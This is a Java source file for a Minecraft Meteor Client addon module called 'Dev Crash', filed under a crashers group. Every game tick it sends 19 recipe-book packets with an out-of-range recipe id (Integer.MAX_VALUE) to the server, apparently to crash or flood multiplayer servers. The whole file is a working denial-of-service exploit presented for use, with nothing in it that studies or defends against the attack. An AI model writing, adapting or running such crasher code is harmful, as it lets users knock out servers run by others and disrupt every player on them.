package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.RecipeBookDataC2SPacket;
import net.minecraft.recipe.NetworkRecipeId;

public class DevCrash extends Module {
    public DevCrash() {
        super(Main.CRASH_GROUP, "Dev Crash", "dev shit");
    }
    private final SettingGroup sg = settings.createGroup("Dev");
    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        for (int i = 0; i < 19; i++) {
            NetworkRecipeId id = new NetworkRecipeId(Integer.MAX_VALUE);
            handler.sendPacket(new RecipeBookDataC2SPacket(id));
        }
    }
}
